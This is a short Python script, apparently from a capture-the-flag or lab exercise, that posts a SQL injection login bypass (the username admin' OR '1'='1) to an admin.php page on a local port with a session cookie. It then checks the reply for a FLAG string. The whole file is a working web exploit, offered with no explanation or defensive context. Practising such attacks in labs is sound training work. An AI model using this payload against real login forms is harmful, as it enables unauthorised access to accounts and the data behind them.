from urllib import request, parse
import json

url = "http://127.0.0.1:32816/admin.php"
data = parse.urlencode({"username": "admin' OR '1'='1", "password": "x"}).encode()
headers = {"Cookie": "PHPSESSID=40bd21fd631cfebd5f684d8a97f3d915"}

req = request.Request(url, data=data, headers=headers)
try:
    resp = request.urlopen(req, timeout=5)
    print(f"Status: {resp.status}")
    content = resp.read().decode()
    print(f"Length: {len(content)}")
    if 'FLAG{' in content:
        print("FLAG FOUND")
except Exception as e:
    print(f"Error: {e}")

